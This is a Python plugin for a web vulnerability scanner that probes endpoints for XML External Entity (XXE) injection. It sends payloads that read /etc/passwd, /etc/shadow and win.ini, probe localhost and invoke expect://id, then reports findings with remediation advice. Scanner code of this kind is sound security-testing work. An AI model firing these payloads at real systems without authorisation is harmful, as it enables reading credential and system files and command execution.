"""XXE (XML External Entity) audit plugin."""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine

logger = structlog.get_logger()

XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
]

XXE_ERROR_PATTERNS = [
    "xml parsing", "xml declaration", "entity reference", "doctype",
    "external entity", "lxml.etree", "sax", "xmlparser",
]


class XxePlugin(AuditPlugin):
    """XML External Entity (XXE) vulnerability detector."""

    plugin_name = "xxe"
    brief_description = "Detect XML External Entity (XXE) injection vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        resp = await http.get(freq.url.raw_url)
        content_type = resp.headers.get("content-type", "").lower()

        is_xml_endpoint = any(t in content_type for t in ["xml", "soap", "wsdl"])
        if not is_xml_endpoint:
            if not any(p in freq.url.path.lower() for p in [".xml", ".wsdl", ".soap", "xmlrpc", "soap"]):
                return

        tasks = [self._test_xxe(freq, http, payload) for payload in XXE_PAYLOADS]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_xxe(self, freq: Any, http: HttpEngine, payload: str) -> None:
        headers = {
            "Content-Type": "application/xml",
            "Accept": "application/xml, text/xml, */*",
        }
        resp = await http.post(freq.url.raw_url, content=payload.encode(), headers=headers)

        if resp.status_code == 200:
            if "root:" in resp.text or "[fonts]" in resp.text or "localhost" in resp.text:
                self.report_finding(
                    name=f"XXE on {freq.url.raw_url}",
                    severity="critical",
                    url=freq.url.raw_url,
                    description="XML External Entity injection detected. The application "
                    "processes XML entities and returns file contents.",
                    evidence=f"Payload: {payload[:120]}\nFile content found in response",
                    http_request={"method": "POST", "url": freq.url.raw_url, "data": payload[:200]},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="Disable XML external entity processing. Use JSON instead of XML. "
                    "Validate and sanitize XML input. Use defusedxml library.",
                )
                return

        for pattern in XXE_ERROR_PATTERNS:
            if pattern.lower() in resp.text.lower():
                self.report_finding(
                    name=f"Potential XXE on {freq.url.raw_url}",
                    severity="medium",
                    url=freq.url.raw_url,
                    description=f"XML error pattern detected ({pattern}). "
                    "The endpoint processes XML but may be vulnerable to XXE.",
                    evidence=f"Error pattern: {pattern}\nPayload: {payload[:120]}",
                    http_request={"method": "POST", "url": freq.url.raw_url},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:300]},
                    remediation="Disable XML external entity processing.",
                )
                return
